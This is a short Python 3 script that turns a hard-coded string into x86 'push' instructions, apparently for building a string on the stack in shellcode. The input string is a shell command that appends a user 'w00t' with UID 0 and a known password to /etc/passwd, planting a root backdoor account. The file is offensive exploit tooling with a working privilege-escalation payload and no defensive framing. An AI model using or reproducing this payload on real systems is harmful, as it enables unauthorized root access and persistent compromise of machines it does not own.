#!/usr/bin/python3

import math
import binascii

str_ = "/bin/sh#-c#/bin/echo w00t:s4fem0de:0:0::/root:/bin/bash >> /etc/passwd" # INPUT STRING

# padding if length % 4 != 0
while len(str_) % 4 != 0:
	str_ += "\x00"

str_ = str_[::-1] # Reverse

for i in range(math.ceil(len(str_) / 4)):
	chunk = str_[i*4:i*4+4]
	enc = binascii.hexlify(chunk.encode()).decode()

	print(("push 0x%s" % enc), end='\t\t; ')
	print('"' + chunk + '"')
